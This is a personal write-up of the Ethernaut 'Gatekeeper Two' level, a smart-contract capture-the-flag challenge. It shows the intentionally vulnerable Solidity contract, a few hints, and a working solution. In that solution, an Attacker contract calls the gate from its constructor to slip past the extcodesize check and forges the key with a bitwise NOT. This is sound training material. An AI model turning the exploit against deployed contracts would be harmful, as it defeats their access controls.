---
title: "Gatekeeper Two"
date: "2024-02-23"
lastmod: "2024-02-23T15:25:00.000Z"
draft: false
difficulty: "⭐⭐⭐"
prev: "Gatekeeper-One-9bbda6efa6c24367aa643eb73ae92a6a"
weight: 15
state: "Terminé"
level-url: "https://ethernaut.openzeppelin.com/level/14"
next: "Naught-Coin-5013cfef45d646e693a6feaac127ac33"
type: "docs"
NOTION_METADATA:
  object: "page"
  id: "d4a070f3-8b64-4143-a295-ecf4467fb7fa"
  created_time: "2024-02-23T12:55:00.000Z"
  last_edited_time: "2024-02-23T15:25:00.000Z"
  created_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  last_edited_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  cover: null
  icon:
    type: "external"
    external:
      url: "https://ethernaut.openzeppelin.com/imgs/BigLevel14.svg"
  parent:
    type: "database_id"
    database_id: "cb6853ff-d731-4d6a-9080-6c8efeec5b1c"
  archived: false
  properties:
    difficulty:
      id: "IAjo"
      type: "select"
      select:
        id: "aa1cb61f-428e-4dc4-abad-06b3092cb0ce"
        name: "⭐⭐⭐"
        color: "green"
    prev:
      id: "LLP%5C"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Gatekeeper-One-9bbda6efa6c24367aa643eb73ae92a6a"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Gatekeeper-One-9bbda6efa6c24367aa643eb73ae92a6a"
          href: null
    date:
      id: "Y%40Gy"
      type: "date"
      date:
        start: "2024-02-23"
        end: null
        time_zone: null
    weight:
      id: "%5Dyda"
      type: "number"
      number: 15
    state:
      id: "f%40ps"
      type: "status"
      status:
        id: "abb7fad3-add1-4b13-946c-06bff36598bf"
        name: "Terminé"
        color: "green"
    level-url:
      id: "juZs"
      type: "url"
      url: "https://ethernaut.openzeppelin.com/level/14"
    next:
      id: "pocA"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Naught-Coin-5013cfef45d646e693a6feaac127ac33"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Naught-Coin-5013cfef45d646e693a6feaac127ac33"
          href: null
    type:
      id: "s%7DKc"
      type: "select"
      select:
        id: "OnJy"
        name: "docs"
        color: "default"
    title:
      id: "title"
      type: "title"
      title:
        - type: "text"
          text:
            content: "Gatekeeper Two"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Gatekeeper Two"
          href: null
  url: "https://www.notion.so/Gatekeeper-Two-d4a070f38b644143a295ecf4467fb7fa"
  public_url: null
UPDATE_TIME: "2024-02-23T21:51:06.414Z"
EXPIRY_TIME: "2024-02-23T22:51:01.957Z"

---
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">


This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.


### Things that might help:

- Remember what you've learned from getting past the first gatekeeper - the first gate is the same.
- The `assembly` keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See [here](http://solidity.readthedocs.io/en/v0.4.23/assembly.html) for more information. The `extcodesize` call in this gate will get the size of a contract's code at a given
address - you can learn more about how and when this is set in section 7 of the [yellow paper](https://ethereum.github.io/yellowpaper/paper.pdf).
- The `^` character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see [here](http://solidity.readthedocs.io/en/v0.4.23/miscellaneous.html#cheatsheet)). The Coin Flip level is also a good place to start when approaching this challenge.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```


Evm op codes: [https://www.evm.codes/?fork=shanghai](https://www.evm.codes/?fork=shanghai)


![](https://prod-files-secure.s3.us-west-2.amazonaws.com/00345c33-b7f7-443a-aca8-598247fb6d93/01b0d58a-bfc6-43bb-bfaf-44883de909fc/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20240223%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240223T215101Z&X-Amz-Expires=3600&X-Amz-Signature=1c5aeeee34adee796552f65f856958e233b4f5745c434f811a4d69216a6549c5&X-Amz-SignedHeaders=host&x-id=GetObject)


![](https://prod-files-secure.s3.us-west-2.amazonaws.com/00345c33-b7f7-443a-aca8-598247fb6d93/fca58f0b-c3a4-4025-9aef-756a0e94ff30/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20240223%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240223T215101Z&X-Amz-Expires=3600&X-Amz-Signature=b8ad3c51333a934838e41f5b4c7d0c728fe534652c57177384accc587a12187e&X-Amz-SignedHeaders=host&x-id=GetObject)


Solution:


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Attacker,GatekeeperTwo} from "../src/14.sol";

contract POC is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address addr = vm.envAddress("INSTANCE_14");

        vm.startBroadcast(deployerPrivateKey);
        GatekeeperTwo gate = GatekeeperTwo(addr);
        new Attacker(address(gate));
        vm.stopBroadcast();

    }
}
```


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "forge-std/console.sol";

interface GatekeeperTwo {
  function enter(bytes8 _gateKey) external returns (bool);
}

contract Attacker {
  GatekeeperTwo gatekeeper;

  constructor(address _gatekeeper) {
    gatekeeper = GatekeeperTwo(_gatekeeper);
    bytes8 value = bytes8(keccak256(abi.encodePacked(address(this))));
    bytes8 gateKey = ~value; 
    // gateKey ^ value == type(uint64).max
    gatekeeper.enter(gateKey);
  }
}
```

